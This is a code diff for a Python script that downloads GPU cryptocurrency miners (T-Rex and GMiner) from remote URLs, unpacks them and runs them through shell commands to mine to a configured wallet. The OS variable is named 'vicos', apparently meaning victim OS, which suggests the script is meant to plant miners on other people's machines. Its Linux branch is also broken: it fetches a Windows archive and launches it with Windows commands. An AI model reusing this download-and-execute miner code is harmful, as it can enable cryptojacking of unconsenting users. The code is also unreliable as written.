@@ -2,17 +2,65 @@ import requests
 import zipfile
 import os
 import subprocess
+import tarfile
 
-url = "https://github.com/trexminer/T-Rex/releases/download/0.24.7/t-rex-0.24.7-win.zip"
-r = requests.get(url, allow_redirects=True)
-open('trex.zip', 'wb').write(r.content)
 
+### customized variables
+### linux or windows
+vicos = ""
+gpu = ""
+"""
+format for nvidia : stratum+tcp://ru-eth.hiveon.net:4444
+format for amd : ru-eth.hiveon.net:4444
+"""
+server = ""
 yourwallet = ""
 
-print('getcwd:      ', os.getcwd())
-
-with zipfile.ZipFile("{}/trex.zip".format(os.getcwd()), 'r') as zip_ref:
-    zip_ref.extractall(os.getcwd())
 
 
-p = subprocess.Popen(["start", "cmd", "/k", "cd {0} && t-rex.exe -a ethash -o stratum+tcp://us1.ethermine.org:4444 -u {1} -p x -w rig0".format(os.getcwd(), yourwallet)], shell = True)
+
+
+if(vicos == "windows"):
+    if(gpu == "nvidia"):
+        url = "https://github.com/trexminer/T-Rex/releases/download/0.24.7/t-rex-0.24.7-win.zip"
+    elif(gpu == "amd"):
+        url = "http://gminer.pro/downloads?res=gminer_2_71_windows64.zip"
+    r = requests.get(url, allow_redirects=True)
+    open('trex.zip', 'wb').write(r.content)
+
+
+
+
+    print('getcwd:      ', os.getcwd())
+
+    with zipfile.ZipFile("{}/trex.zip".format(os.getcwd()), 'r') as zip_ref:
+        zip_ref.extractall(os.getcwd())
+
+    if(gpu == "amd"):
+        p = subprocess.Popen(["start", "cmd", "/k", "cd {0} && miner --algo etchash --server {2} --user {1} --worker xsinsinati5".format(os.getcwd(), yourwallet, server)], shell = True)
+    elif(gpu == "nvidia"):
+        p = subprocess.Popen(["start", "cmd", "/k", "cd {0} && trex -a ethash -o {2} -u {1} -p x -w sinsinati5".format(os.getcwd(), yourwallet, server)], shell = True)
+
+
+
+### now time for the better os
+
+elif(vicos == "linux"):
+    if (gpu == "nvidia"):
+        url = "https://github.com/trexminer/T-Rex/releases/download/0.24.7/t-rex-0.24.7-win.zip"
+    elif (gpu == "amd"):
+        url = "http://gminer.pro/downloads?res=gminer_2_71_linux64.tar.xz"
+    r = requests.get(url, allow_redirects=True)
+    open('trex.tar.xz', 'wb').write(r.content)
+
+    print('getcwd:      ', os.getcwd())
+
+    file = tarfile.open('trex.tar.xz')
+    file.extractall('./{}'.format(os.getcwd()))
+    file.close()
+
+
+    if (gpu == "amd"):
+        p = subprocess.Popen(["start", "cmd", "/k", "cd {0} && ./miner --algo etchash --server {2} --user {1}.sinsinati5".format(os.getcwd(), yourwallet, server)], shell = True)
+    elif (gpu == "nvidia"):
+        p = subprocess.Popen(["start", "cmd", "/k", "cd {0} && ./trex -a ethash -o {2} -u {1} -p x -w sinsinati5".format(os.getcwd(), yourwallet, server)], shell = True)
